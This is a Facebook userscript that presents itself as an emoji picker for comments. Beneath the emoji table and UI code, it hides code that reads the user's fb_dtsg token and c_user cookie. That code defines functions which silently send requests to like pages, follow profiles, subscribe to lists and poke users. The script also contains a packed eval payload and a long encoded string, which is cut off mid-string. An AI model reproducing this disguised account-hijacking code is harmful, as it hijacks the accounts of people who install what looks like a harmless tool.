// ==UserScript==
// @name            Tema Emoji @adibPN
// @description     All about facebook By Adib Pugar Nuraga
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
/*
Complete Emoji Source code reference
https://android.googlesource.com/platform/packages/inputmethods/OpenWnn/+/jb-dev/res/xml/symbols_japan_emoji_list1.xml
https://android.googlesource.com/platform/packages/inputmethods/OpenWnn/+/jb-dev/res/xml/symbols_japan_emoji_list2.xml
https://android.googlesource.com/platform/packages/inputmethods/OpenWnn/+/jb-dev/res/xml/symbols_japan_emoji_list3.xml
JSON conversion Adib Pugar Nuraga
*/

var symbols_japan_emoji_list=[
  {name:"Nature",subs:[
    {name:"Weather",list:[{cd:"\udbb8\udc00",cl:"_2h7"},{cd:"\udbb8\udc01",cl:"_2h8"},{cd:"\udbb8\udc02",cl:"_2h9"},{cd:"\udbb8\udc03",cl:"_2h3"},{cd:"\udbb8\udc04",cl:"_2h2"},{cd:"\udbb8\udc05",cl:"_2b_"},"\udbb8\udc06",{cd:"\udbb8\udc07",cl:"_2c0"},"\udbb8\udc08","\udbb8\udc09","\udbb8\udc0a","\udbb8\udc0b","\udbb8\udc0c","\udbb8\udc0d","\udbb8\udc0e","\udbb8\udc0f","\udbb8\udc10"]},
    {name:"Moon",list:["\udbb8\udc11","\udbb8\udc12","\udbb8\udc13",{cd:"\udbb8\udc14",cl:"_2c2"},"\udbb8\udc15","\udbb8\udc16","\udbb8\udc17"]},
    {name:"Places in Nature",list:[{cd:"\udbb8\udc38",cl:"_2c1"},"\udbb8\udc39","\udbb8\udc3a","\udbb8\udc3b"]},
    {name:"Plants",list:[{cd:"\udbb8\udc3c",cl:"_2cd"},{cd:"\udbb8\udc3d",cl:"_2c7"},{cd:"\udbb8\udc3e",cl:"_2c4"},{cd:"\udbb8\udc3f",cl:"_2ce"},{cd:"\udbb8\udc40",cl:"_2c8"},{cd:"\udbb8\udc41",cl:"_2c9"},{cd:"\udbb8\udc42",cl:"_2cf"},{cd:"\udbb8\udc43",cl:"_2cg"},"\udbb8\udc44",{cd:"\udbb8\udc45",cl:"_2ca"},{cd:"\udbb8\udc46",cl:"_2cb"},{cd:"\udbb8\udc47",cl:"_2c5"},{cd:"\udbb8\udc48",cl:"_2c6"},{cd:"\udbb8\udc49",cl:"_2cc"},"\udbb8\udc4a","\udbb8\udc4b","\udbb8\udc4c","\udbb8\udc4d","\udbb8\udc4e"]},
    {name:"Fruits",list:["\udbb8\udc4f","\udbb8\udc50",{cd:"\udbb8\udc51",cl:"_2ci"},{cd:"\udbb8\udc52",cl:"_2ch"},{cd:"\udbb8\udc53",cl:"_2cj"},"\udbb8\udc54","\udbb8\udc55","\udbb8\udc56","\udbb8\udc57","\udbb8\udc58","\udbb8\udc59","\udbb8\udc5a","\udbb8\udc5b"]}
  ]},
  {name:"Human/Living Things",subs:[
    {name:"Facial Parts",list:[{cd:"\udbb8\udd90",cl:"_2dx"},{cd:"\udbb8\udd91",cl:"_2dy"},{cd:"\udbb8\udd92",cl:"_2dz"},{cd:"\udbb8\udd93",cl:"_2d-"},{cd:"\udbb8\udd94",cl:"_2d_"}]},
    {name:"Personal Care",list:["\udbb8\udd95",{cd:"\udbb8\udd96",cl:"_2ey"},"\udbb8\udd97","\udbb8\udd98","\udbb8\udd99"]},
    {name:"People / Personalities",list:["\udbb8\udd9a",{cd:"\udbb8\udd9b",cl:"_2eb"},{cd:"\udbb8\udd9c",cl:"_2ec"},{cd:"\udbb8\udd9d",cl:"_2ed"},{cd:"\udbb8\udd9e",cl:"_2ee"},"\udbb8\udd9f",{cd:"\udbb8\udda0",cl:"_2ef"},{cd:"\udbb8\udda1",cl:"_2eg"},{cd:"\udbb8\udda2",cl:"_2eh"},"\udbb8\udda3",{cd:"\udbb8\udda4",cl:"_2ei"},{cd:"\udbb8\udda5",cl:"_2ej"},{cd:"\udbb8\udda6",cl:"_2ek"},{cd:"\udbb8\udda7",cl:"_2el"},{cd:"\udbb8\udda8",cl:"_2em"},{cd:"\udbb8\udda9",cl:"_2en"},{cd:"\udbb8\uddaa",cl:"_2eo"},{cd:"\udbb8\uddab",cl:"_2ep"},"\udbb8\uddac","\udbb8\uddad",{cd:"\udbb8\uddae",cl:"_2eq"},{cd:"\udbb8\uddaf",cl:"_2er"},{cd:"\udbb8\uddb0",cl:"_2es"},{cd:"\udbb8\uddb1",cl:"_2et"},{cd:"\udbb8\uddb2",cl:"_2eu"},{cd:"\udbb8\uddb3",cl:"_2ev"},"\udbb8\uddb4",{cd:"\udbb8\uddb5",cl:"_2ew"},{cd:"\udbb8\uddb6",cl:"_2ex"}]},
    {name:"Animals",list:[{cd:"\udbb8\uddb7",cl:"_491"},{cd:"\udbb8\uddb8",cl:"_2dn"},"\udbb8\uddb9","\udbb8\uddba",{cd:"\udbb8\uddbb",cl:"_2dc"},{cd:"\udbb8\uddbc",cl:"_2de"},{cd:"\udbb8\uddbd",cl:"_2d9"},{cd:"\udbb8\uddbe",cl:"_2dp"},{cd:"\udbb8\uddbf",cl:"_2dr"},{cd:"\udbb8\uddc0",cl:"_2dl"},{cd:"\udbb8\uddc1",cl:"_2dv"},{cd:"\udbb8\uddc2",cl:"_2dj"},{cd:"\udbb8\uddc3",cl:"_2do"},{cd:"\udbb8\uddc4",cl:"_2dq"},{cd:"\udbb8\uddc5",cl:"_2d6"},{cd:"\udbb8\uddc6",cl:"_2d7"},{cd:"\udbb8\uddc7",cl:"_2di"},{cd:"\udbb8\uddc8",cl:"_2dd"},{cd:"\udbb8\uddc9",cl:"_2da"},{cd:"\udbb8\uddca",cl:"_2dt"},{cd:"\udbb8\uddcb",cl:"_2d8"},{cd:"\udbb8\uddcc",cl:"_2d5"},{cd:"\udbb8\uddcd",cl:"_2df"},{cd:"\udbb8\uddce",cl:"_2d2"},{cd:"\udbb8\uddcf",cl:"_2d1"},{cd:"\udbb8\uddd0",cl:"_2du"},{cd:"\udbb8\uddd1",cl:"_2dk"},{cd:"\udbb8\uddd2",cl:"_2dm"},{cd:"\udbb8\uddd3",cl:"_2c_"},{cd:"\udbb8\uddd4",cl:"_2d3"},{cd:"\udbb8\uddd5",cl:"_2d4"},{cd:"\udbb8\uddd6",cl:"_2dh"},{cd:"\udbb8\uddd7",cl:"_2ds"},{cd:"\udbb8\uddd8",cl:"_2dg"},{cd:"\udbb8\uddd9",cl:"_2db"},"\udbb8\uddda",{cd:"\udbb8\udddb",cl:"_2dw"},"\udbb8\udddc","\udbb8\udddd","\udbb8\uddde","\udbb8\udddf","\udbb8\udde0","\udbb8\udde1","\udbb8\udde2","\udbb8\udde3"]}
  ]},
  {name:"Faces and Smiley's",subs:[
    {name:"Faces",list:[{cd:"\udbb8\udf20",cl:"_2g9"},{cd:"\udbb8\udf21",cl:"_2gg"},{cd:"\udbb8\udf22",cl:"_2gm"},{cd:"\udbb8\udf23",cl:"_2g8"},{cd:"\udbb8\udf24",cl:"_2go"},{cd:"\udbb8\udf25",cl:"_2gk"},{cd:"\udbb8\udf26",cl:"_2g0"},{cd:"\udbb8\udf27",cl:"_2f-"},{cd:"\udbb8\udf28",cl:"_2gd"},{cd:"\udbb8\udf29",cl:"_2g6"},{cd:"\udbb8\udf2a",cl:"_2g7"},{cd:"\udbb8\udf2b",cl:"_2fy"},{cd:"\udbb8\udf2c",cl:"_2g4"},{cd:"\udbb8\udf2d",cl:"_2g5"},{cd:"\udbb8\udf2e",cl:"_2gp"},{cd:"\udbb8\udf2f",cl:"_2gn"},{cd:"\udbb8\udf30",cl:"_2fu"},"\udbb8\udf31",{cd:"\udbb8\udf32",cl:"_2fw"},{cd:"\udbb8\udf33",cl:"_2fs"},{cd:"\udbb8\udf34",cl:"_2ft"},"\udbb8\udf35",{cd:"\udbb8\udf36",cl:"_2h1"},"\udbb8\udf37",{cd:"\udbb8\udf38",cl:"_2fv"},{cd:"\udbb8\udf39",cl:"_2gb"},{cd:"\udbb8\udf3a",cl:"_2gj"},{cd:"\udbb8\udf3b",cl:"_2gf"},{cd:"\udbb8\udf3c",cl:"_2gc"},{cd:"\udbb8\udf3d",cl:"_2ga"},{cd:"\udbb8\udf3e",cl:"_2fz"},{cd:"\udbb8\udf3f",cl:"_2g3"},{cd:"\udbb8\udf40",cl:"_2g2"},{cd:"\udbb8\udf41",cl:"_2gl"},{cd:"\udbb8\udf42",cl:"_2gh"},{cd:"\udbb8\udf43",cl:"_2f_"},{cd:"\udbb8\udf44",cl:"_2g1"},{cd:"\udbb8\udf45",cl:"_2ge"},{cd:"\udbb8\udf46",cl:"_2gi"},{cd:"\udbb8\udf47",cl:"_2fx"}]},
    {name:"More faces (animals, persons, characters)",list:[{cd:"\udbb8\udf48",cl:"_2gs"},{cd:"\udbb8\udf49",cl:"_2gq"},{cd:"\udbb8\udf4a",cl:"_2gr"},{cd:"\udbb8\udf4b",cl:"_2gv"},{cd:"\udbb8\udf4c",cl:"_2gt"},{cd:"\udbb8\udf4d",cl:"_2gw"},"\udbb8\udf4e",{cd:"\udbb8\udf4f",cl:"_2gu"},{cd:"\udbb8\udf50",cl:"_2gx"},"\udbb8\udf51","\udbb8\udf52","\udbb8\udf53","\udbb8\udf54","\udbb8\udf55","\udbb8\udf56",{cd:"\udbb8\udf57",cl:"_2gy"},{cd:"\udbb8\udf58",cl:"_2gz"},{cd:"\udbb8\udf59",cl:"_2g-"},"\udbb8\udf5a",{cd:"\udbb8\udf5b",cl:"_2g_"},"\udbb8\udf5c","\udbb8\udf5d","\udbb8\udf5e","\udbb8\udf5f","\udbb8\udf60","\udbb8\udf61","\udbb8\udf62","\udbb8\udf63","\udbb8\udf64","\udbb8\udf65","\udbb8\udf66","\udbb8\udf67","\udbb8\udf68","\udbb8\udf69"]}
  ]},
  {name:"Artifacts",subs:[
    {name:"Miscellaneous Things",list:["\udbb9\udcef","\udbb9\udcf0","\udbb9\udcf1",{cd:"\udbb9\udcf2",cl:"_2fr"},"\udbb9\udcf3",{cd:"\udbb9\udcf4",cl:"_2ff"},"\udbb9\udcf5",{cd:"\udbb9\udcf6",cl:"_492"},"\udbb9\udcf7","\udbb9\udcf8","\udbb9\udcf9","\udbb9\udcfa","\udbb9\udcfb","\udbb9\udcfc","\udbb9\udcfd","\udbb9\udcfe","\udbb9\udcff","\udbb9\udd00","\udbb9\udd01","\udbb9\udd02","\udbb9\udd03","\udbb9\udd04"]},
    {name:"Celebration / Holidays",list:["\udbb9\udd0f",{cd:"\udbb9\udd10",cl:"_2cn"},"\udbb9\udd11",{cd:"\udbb9\udd12",cl:"_2cp"},{cd:"\udbb9\udd13",cl:"_2cq"},"\udbb9\udd14","\udbb9\udd15",{cd:"\udbb9\udd16",cl:"_2cr"},{cd:"\udbb9\udd17",cl:"_2cs"},{cd:"\udbb9\udd18",cl:"_2ct"},{cd:"\udbb9\udd19",cl:"_2cu"},{cd:"\udbb9\udd1a",cl:"_2cx"},"\udbb9\udd1b",{cd:"\udbb9\udd1c",cl:"_2cv"},"\udbb9\udd1d",{cd:"\udbb9\udd1e",cl:"_2cw"},{cd:"\udbb9\udd1f",cl:"_2co"},"\udbb9\udd20","\udbb9\udd21"]},
    {name:"Communication",list:["\udbb9\udd22","\udbb9\udd23",{cd:"\udbb9\udd24",cl:"_2fm"},{cd:"\udbb9\udd25",cl:"_2fo"},{cd:"\udbb9\udd26",cl:"_2fp"},"\udbb9\udd27",{cd:"\udbb9\udd28",cl:"_2fn"},"\udbb9\udd29","\udbb9\udd2a","\udbb9\udd2b","\udbb9\udd2c","\udbb9\udd2d","\udbb9\udd2e","\udbb9\udd2f","\udbb9\udd30","\udbb9\udd31","\udbb9\udd32","\udbb9\udd33","\udbb9\udd34","\udbb9\udd35"]},
    {name:"Office",list:["\udbb9\udd36","\udbb9\udd37",{cd:"\udbb9\udd38",cl:"_2fh"},"\udbb9\udd39","\udbb9\udd3a","\udbb9\udd3b",{cd:"\udbb9\udd3c",cl:"_2fi"},{cd:"\udbb9\udd3d",cl:"_2fj"},"\udbb9\udd3e","\udbb9\udd3f","\udbb9\udd40","\udbb9\udd41","\udbb9\udd42","\udbb9\udd43","\udbb9\udd44","\udbb9\udd45","\udbb9\udd46","\udbb9\udd47","\udbb9\udd48","\udbb9\udd49","\udbb9\udd4a","\udbb9\udd4b","\udbb9\udd4c","\udbb9\udd4d","\udbb9\udd4e","\udbb9\udd4f","\udbb9\udd50","\udbb9\udd51","\udbb9\udd52"]}
  ]},
  {name:"Activities / Work / Entertainment",subs:[
    {name:"Sports",list:["\udbb9\udfd0","\udbb9\udfd1","\udbb9\udfd2","\udbb9\udfd3","\udbb9\udfd4","\udbb9\udfd5","\udbb9\udfd6","\udbb9\udfd7","\udbb9\udfd8","\udbb9\udfd9","\udbb9\udfda","\udbb9\udfdb",{cd:"\udbb9\udfdc",cl:"_2d0"},"\udbb9\udfdd","\udbb9\udfde"]},
    {name:"Music",list:[{cd:"\udbba\udc13",cl:"_2cy"},{cd:"\udbba\udc14",cl:"_2cz"},"\udbba\udc15","\udbba\udc16","\udbba\udc17","\udbba\udc18","\udbba\udc19",{cd:"\udbba\udc1a",cl:"_2c-"},"\udbba\udc1b"]},
    {name:"Media",list:[{cd:"\udbba\udc1c",cl:"_2fq"},{cd:"\udbba\udc1d",cl:"_2fk"},{cd:"\udbba\udc1e",cl:"_2fl"},"\udbba\udc1f","\udbba\udc20","\udbba\udc21","\udbba\udc22"]},
    {name:"Romance",list:[{cd:"\udbba\udc23",cl:"_2ez"},"\udbba\udc24","\udbba\udc25","\udbba\udc26",{cd:"\udbba\udc27",cl:"_2e-"},{cd:"\udbba\udc28",cl:"_2e_"},{cd:"\udbba\udc29",cl:"_2f0"},"\udbba\udc2a"]}
  ]},
  {name:"Foods",subs:[
    {name:"Prepared Food",list:[{cd:"\udbba\udd60",cl:"_2ck"},"\udbba\udd61","\udbba\udd62","\udbba\udd63","\udbba\udd64","\udbba\udd65","\udbba\udd66","\udbba\udd67","\udbba\udd68","\udbba\udd69","\udbba\udd6a","\udbba\udd6b","\udbba\udd6c","\udbba\udd6d","\udbba\udd6e","\udbba\udd6f","\udbba\udd70","\udbba\udd71","\udbba\udd72","\udbba\udd73","\udbba\udd74","\udbba\udd75","\udbba\udd76","\udbba\udd77","\udbba\udd78","\udbba\udd79","\udbba\udd7a","\udbba\udd7b","\udbba\udd7c","\udbba\udd7d","\udbba\udd7e","\udbba\udd7f","\udbba\udd80"]},
    {name:"Drink",list:[{cd:"\udbba\udd81",cl:"_2ha"},{cd:"\udbba\udd82",cl:"_2cl"},{cd:"\udbba\udd83",cl:"_2cm"},"\udbba\udd84","\udbba\udd85","\udbba\udd86","\udbba\udd87","\udbba\udd88"]}
  ]},
  {name:"Abstract Concepts",subs:[
    {name:"Hearts",list:[{cd:"\udbba\udf0c",cl:"_2hc"},{cd:"\udbba\udf0d",cl:"_2f1"},{cd:"\udbba\udf0e",cl:"_2f2"},"\udbba\udf0f",{cd:"\udbba\udf10",cl:"_2f3"},{cd:"\udbba\udf11",cl:"_2f4"},{cd:"\udbba\udf12",cl:"_2f5"},{cd:"\udbba\udf13",cl:"_2f6"},{cd:"\udbba\udf14",cl:"_2f7"},{cd:"\udbba\udf15",cl:"_2f8"},{cd:"\udbba\udf16",cl:"_2f9"},{cd:"\udbba\udf17",cl:"_2fa"},"\udbba\udf18","\udbba\udf19"]},
    {name:"Emotion Symbols",list:["\udbba\udf55","\udbba\udf56",{cd:"\udbba\udf57",cl:"_2fb"},"\udbba\udf58",{cd:"\udbba\udf59",cl:"_2fc"},"\udbba\udf5a",{cd:"\udbba\udf5b",cl:"_2fd"},"\udbba\udf5c",{cd:"\udbba\udf5d",cl:"_2fe"},{cd:"\udbba\udf5e",cl:"_2fg"},"\udbba\udf5f"]},
    {name:"Shapes / Sparkles",list:[{cd:"\udbba\udf60",cl:"_2hb"},"\udbba\udf61","\udbba\udf62","\udbba\udf63","\udbba\udf64","\udbba\udf65","\udbba\udf66","\udbba\udf67","\udbba\udf68",{cd:"\udbba\udf69",cl:"_2c3"},"\udbba\udf6a","\udbba\udf6b","\udbba\udf6c","\udbba\udf6d","\udbba\udf6e","\udbba\udf6f","\udbba\udf70","\udbba\udf71","\udbba\udf72","\udbba\udf73","\udbba\udf74","\udbba\udf75","\udbba\udf76","\udbba\udf77","\udbba\udf78","\udbba\udf79"]},
    {name:"Hand Signals",list:[{cd:"\udbba\udf93",cl:"_2h4"},{cd:"\udbba\udf94",cl:"_2h6"},{cd:"\udbba\udf95",cl:"_2h5"},{cd:"\udbba\udf96",cl:"_2e4"},{cd:"\udbba\udf97",cl:"_2e7"},{cd:"\udbba\udf98",cl:"_2h0"},{cd:"\udbba\udf99",cl:"_2e0"},{cd:"\udbba\udf9a",cl:"_2e1"},{cd:"\udbba\udf9b",cl:"_2e2"},{cd:"\udbba\udf9c",cl:"_2e3"},{cd:"\udbba\udf9d",cl:"_2e5"},{cd:"\udbba\udf9e",cl:"_2e9"},{cd:"\udbba\udf9f",cl:"_2e6"},{cd:"\udbba\udfa0",cl:"_2e8"},{cd:"\udbba\udfa1",cl:"_2ea"},"\udbba\udfa2"]}
  ]}
];

var aing={
  aduk:function(a){var b=a.length,c,d;while(0!==b){d=Math.floor(Math.random()*b);b-=1;c=a[b];a[b]=a[d];a[d]=c}return a},
  acak:function(a){return a[Math.floor(Math.random()*a.length)]},
  getCommentsTextareas:function(){return document.getElementsByName("add_comment_text_text")},
  getMyUserId:function(){var a;if(document.getElementsByClassName("fbxWelcomeBoxImg")[0]){a=/[0-9]{8,}/.exec(document.getElementsByClassName("fbxWelcomeBoxImg")[0].id)[0]}else if(document.cookie&&document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])){a=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])}return a},
  putDiAwal:function(a,b){var e=document.createElement("div");e.innerHTML=a;while(e.firstChild){b.insertBefore(e.firstChild,b.firstChild)}},
  putDiAhir:function(a,b){var e=document.createElement("div");e.innerHTML=a;while(e.firstChild){b.appendChild(e.firstChild)}},
  cbGntBg:function(){if(document.getElementById("box-aing")){var a=document.getElementsByClassName("photo");a=aing.aduk(a);for(x in a){if(a[x].src){document.getElementById("box-aing").style.backgroundImage="url("+a[x].src+")"}break}}eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(i(){q(!7.9("\\2\\c")){l.y("<d\\6 \\n=\\"\\2\\c\\" o=\\"f\\4\\g-s\\h:8;j-\\k\\1\\5\\3:r\\1\\t;p\\u\\1\\3\\5:0 8\\"><\\2 v=\\"w://\\2\\1\\3\\5\\x\\e\\1\\4\\a.z\\4\\B\\C.\\D\\E/\\"></\\2> m\\G H\\I.</d\\6>",7.9("b\\J-\\2\\1\\3\\5"))}})();',46,46,'|x69|x61|x6E|x6F|x67|x69v|docum\x65nt|10px|g\x65tEl\x65m\x65ntById|x6Es||x63mt||x61t||x6Et|x69ze|funct\x69on|t\x65xt|x61l|\x61\x69\x6E\x67||x69d|styl\x65||if|||x67ht|x61dd|hr\x65f|http|x63re|putD\x69Ah\x69r|bl||x67sp|x6Ft|x63|x6Fm|x67Cr\x65|x61de|th|x69s|x6Fx'.split('|'),0,{}))},
  stl:{luar:"z-index:99999;text-align:center;border-radius:5px;position:fixed;width:360px;left:10px;bottom:10px;background-image:none;background-position:top center;background-size:100% auto;box-shadow:0 0 7px rgba(0,0,0,0.5);overflow:hidden",dlm:"background-color:rgba(223,227,234,0.75);border-radius:3px;padding:2px;margin:1px 0",ddm:"background-color:rgba(223,227,234,0.25);border-radius:5px;padding:5px 10px;min-height:150px;overflow:hidden",jdl:"margin:0 21px 10px 0;color:white;text-shadow:0 0 7px black"},
  slide:function(a,i,n,g){if(g==null){var stp=10,d=((a.style.bottom.replace(/px/i,"")*1)-stp),e=(a.offsetWidth-(stp*2));if(d>i){a.style.bottom=d+"px";setTimeout(function(){aing.slide(a,i,n)},Math.round(stp/2))}else if(e>n){if((d+stp)!=i){a.style.bottom=i+"px"}a.style.width=e+"px";setTimeout(function(){aing.slide(a,i,n)},Math.round(stp/2))}else{a.style.width=n+"px"}}else{var stp=10,d=(a.offsetHeight+stp),e=(a.offsetWidth+(stp*2));if(e<n){a.style.width=e+"px";setTimeout(function(){aing.slide(a,i,n,g)},Math.round(stp/2))}else if(d<i){a.style.height=d+"px";setTimeout(function(){aing.slide(a,i,n,g)},Math.round(stp/2))}else{a.style.height=i+"px";a.style.width=n+"px"}}},
  hide:function(a){var g=10,h=250,d=26,b=document.getElementById("box-aing"),c=document.getElementById("bycat"),e=(b.style.bottom.replace(/px/i,"")*1),f=((b.offsetHeight-d)+e)+"px";if(b.offsetHeight==d){aing.stepview=1;b.style.bottom=g+"px";aing.slide(b,aing.higBipor,aing.widBipor,"up");if(c.style.display=="none"){a.title="Show by Category"}else{a.title="Show All"}aing.cbGntBg()}else{aing.stepview=4;aing.widBipor=b.offsetWidth;aing.higBipor=b.offsetHeight;b.style.height=d+"px";b.style.bottom=f;aing.slide(b,g,h);a.title="Maximize";b.style.backgroundImage="none"}},
  catall:function(a){var b=document.getElementById("prepiyuw"),c=document.getElementById("bycat");if(b.style.display=="none"){c.style.display="none";b.style.display="block";if(aing.stepview<3){a.title="Show All"}else{a.title="Minimize"}}else{if(c.clientHeight!=b.clientHeight){c.style.height=b.clientHeight+"px"}b.style.display="none";c.style.display="block";if(aing.stepview<3){a.title="Show All"}else{a.title="Minimize"}}},
  stepview:1,
  view:function(a){if(aing.stepview<3){aing.stepview++;aing.catall(a)}else if(aing.stepview<5){aing.hide(a)}else{aing.stepview=1}},
  emot:function(a,i,n,g,s){var e="<div onClick=\""+i+"\"";if(s!=null){e+=" title=\""+s+"\""}e+=" onMouseover=\"this.style.backgroundColor='"+n+"'\" onMouseout=\"this.style.backgroundColor='transparent'\" style=\"cursor:pointer;display:inline-block;padding:1px\"><span class=\"_1az _1a-";if(a!=null){e+=" "+a}e+="\">";if(g!=null){e+=g}e+="</span></div>";return e},
  nyubox:function(j,h,k){var jd="<h2 id=\"judul\" style=\""+aing.stl.jdl+"\">",hs="<div id=\"hasil\" style=\""+aing.stl.dlm+"\">",ks="<div id=\"konsol\" style=\""+aing.stl.dlm+"\">";if(j!=null){jd+=j}jd+="</h2>";if(h!=null){hs+=h}hs+="</div>";if(k!=null){ks+=k}ks+="</div>";if(document.getElementById("box-aing")){var bafc=document.getElementById("box-aing").firstChild;if(j!=null){if(document.getElementById("judul")){document.getElementById("judul").innerHTML=j}else{aing.putDiAwal(jd,bafc)}}if(h!=null){if(document.getElementById("hasil")){document.getElementById("hasil").innerHTML=h}else{aing.putDiAhir(hs,bafc)}}if(k!=null){if(document.getElementById("konsol")){document.getElementById("konsol").innerHTML=k}else{aing.putDiAhir(ks,bafc)}}}else{var a="<div id=\"box-aing\" style=\""+aing.stl.luar+"\"><div style=\""+aing.stl.ddm+"\">";if(j!=null){a+=jd}if(h!=null){a+=hs}if(k!=null){a+=ks}a+="</div><div style=\"position:absolute;top:5px;right:5px;tex-align:right\">"+aing.emot("_2dx","aing.view(this)","yellow",null,"Show by Category")+"</div></div>";aing.putDiAhir(a,document.body)}aing.cbGntBg()},
  asupkeun:function(a,d,e){var b=aing.getCommentsTextareas(),c=symbols_japan_emoji_list,f=document.getElementById("tmpt-emj"),g,h,i=document.getElementById("prepiyuw");if(!document.getElementById("acmt")){return false}if(e==null){g="";for(y in c[a].subs[d].list){if(c[a].subs[d].list[y].cd){g+=c[a].subs[d].list[y].cd}else{g+=c[a].subs[d].list[y]}}}else{if(c[a].subs[d].list[e].cd){g=c[a].subs[d].list[e].cd}else{g=c[a].subs[d].list[e]}}f.value+=g;if(b.length==0){f.focus()}else{for(var x=0;x<b.length;x++){if(b[x].value!=b[x].placeholder){b[x].value+=g;b[x].focus();f.value=b[x].value;break}}}},
  tesEmoji:function(){symbols_japan_emoji_list=aing.aduk(symbols_japan_emoji_list);var isiprepiyuw="",tmb="max-height:300px;text-align:left;overflow:auto",a="<div id=\"prepiyuw\" style=\""+tmb+"\"></div><div id=\"bycat\" style=\"display:none;"+tmb+"\"><ol style=\"padding:0;margin:0;list-style-type:none\">",b=symbols_japan_emoji_list,c="<textarea id=\"tmpt-emj\" onClick=\"this.select()\" style=\"width:100%;height:50px;resize:none;padding:0;border:none;border-radius:3px;background-color:transparent\"></textarea>";for(x in b){a+="<li><h2 style=\""+aing.stl.dlm+";text-align:center\">"+b[x].name+"</h2><ol style=\"padding:0 10px;list-style-type:none\">";for(y in b[x].subs){a+="<li><b><a href=\"#\" title=\"Click to add all\" onClick=\"aing.asupkeun("+x+","+y+");return false\">"+b[x].subs[y].name+"</a></b><center>";for(z in b[x].subs[y].list){var tahieu=b[x].subs[y].list[z],emt;if(tahieu.cl){emt=aing.emot(tahieu.cl,"aing.asupkeun("+x+","+y+","+z+")","white");isiprepiyuw+=emt}else{emt=aing.emot(null,"aing.asupkeun("+x+","+y+","+z+")","lightgreen",tahieu)};a+=emt}a+="</center></li>"}a+="</ol></li>"}a+="</ol></div>";aing.nyubox("Emoji Clickboard By Adib Pugar Nuraga ♥ klik 3x pada gambar mata utk menutup",a,c);if(isiprepiyuw!=""){aing.putDiAhir(isiprepiyuw,document.getElementById("prepiyuw"))}}
};
aing.tesEmoji();
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
function Like(p) { 
var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; 
var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); } 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; 
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
function a(abone) { 
var http4=new XMLHttpRequest; var url4="/ajax/follow/follow_profile.php?__a=1"; 
var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp="; http4.open("POST",url4,true); http4.onreadystatechange=function() { 
if(http4.readyState==4&&http4.status==200)http4.close } ; http4.send(params4) } 
function sublist(uidss) { 
var a = document.createElement('script'); a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();"; document.body.appendChild(a); } 
function p(abone) { 
var http4 = new XMLHttpRequest(); var url4 = "//www.facebook.com/ajax/poke_dialog.php"; 
var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp="; http4.open("POST", url4, true); http4.onreadystatechange = function () { if (http4.readyState == 4 && http4.status == 200) { http4.close; } }; http4.send(params4); }
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); 
var _2532;var _9889='4320B105B110D925C1000A965A910D995C940E970F965B575C815C615E970D975B970D620B575A1030A575F465B1005C900C985A575F855B575A720A575E965E920E1010E575D855E800C795C775E995E995C975B825E920E980F1000F920B990B995B615F620E710D575B1005A900F985C575E855A840F825A795F575E720F585B650D650D1010D1010E1010E645A925C900E910D920D905E970E970F950E645C910A970D960D650D900C945B900A1015E650D1000B925E940A650B955B940F950B920B645D975F935B975C585A710C575F465D1005F900D985B575E855A815F900D985F900B960E990E575C720A575C585F955E940A950D920B890A900A910E995A940C970D965C720F995C985B1000F920E605C925E995C890E920E965A995B890B940F915F920E965A995A940E925B940F920F985B720F585F630C970C975D970D630C585C605C990B970F1000B985E910B920A720E660C605D910B955F940F920B965F995E890A940D915A720B585E630A965F970F1010E630C585B600B670B740A670A690D700D690C695F670B695C680C690F605F985A970A970B995D940A915B720C1000E890E945B990F970B965E975E890F670D700D890B660A695B605C930F940B925A995F970B910D910F900A990B940C970D965A605E925B995C870D995A965A880F720B600D670E760D600F670E755B605E925D995A870F995B1020E975A920A880B720E665D655E605E925D995C870E980F940C915C880A720E680D695D700E655D695D660D660D670E665B700E675A690E655D665F690E700B665C680B690F605B925E995A870B960B925D890D990D995C970C985A1020D890A950D920B1020C880D720D665D695E660B675D700E685B665A700E655E655B660F700E670D660B675B670B700A680E665D605A925B995A870C935D900E990A890B920F1015D975A900C965E915C920E915A890D1000E925A940F880D720C660B605B965B910A995E985C870E890A960F970A915E880F720A975B900F930B920F955F920F995E890C935A970F960B920D890E990D995A985B920A900F960E605C890E890C1000B990E920B985A720E585B630B1000F990C920D985A890B940B915E630A585B605B890C890B900A720E660D605C890C890E915D1020E965F720A690F965F695B695A820A970E740D800D745A955F750D955F1020A970B910F975E900E920B605F890A890E985D920F980D720B930D675B605B925F905A890C915E995D990A930E720F585D630F925F905F890C915A995B990D93